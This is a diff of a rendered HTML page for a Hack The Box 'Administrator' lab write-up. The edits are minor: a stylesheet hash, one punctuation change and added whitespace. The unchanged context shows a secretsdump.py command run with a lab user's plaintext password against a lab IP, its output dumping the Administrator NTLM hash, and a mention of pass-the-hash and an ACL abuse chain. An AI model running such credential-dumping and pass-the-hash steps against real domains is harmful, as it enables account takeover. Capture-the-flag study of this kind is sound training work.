@@ -52,7 +52,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-administrator/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -276,7 +276,7 @@ stroke-linejoin="round" class="feather feather-home">
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">secretsdump.py administrator.htb/ethan:limpbizkit@10.129.9.36
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[*] Using the DRSUAPI method to get NTDS.DIT secrets
 </span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
-</span></span></code></pre></div><p>Pass-the-hash as Administrator. Root flag. What I liked about this box is how every step in the ACL chain used a different primitive. ForceChangePassword, GenericWrite, WriteDACL, ownership - not the same trick repeated six times. Good one to run through if you want to build muscle memory for moving through realistic ACL chains.</p>
+</span></span></code></pre></div><p>Pass-the-hash as Administrator. Root flag. What I liked about this box is how every step in the ACL chain used a different primitive. ForceChangePassword, GenericWrite, WriteDACL, ownership, not the same trick repeated six times. Good one to run through if you want to build muscle memory for moving through realistic ACL chains.</p>
 
             </div>
         </article></main>
@@ -401,6 +401,11 @@ stroke-linejoin="round" class="feather feather-home">
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
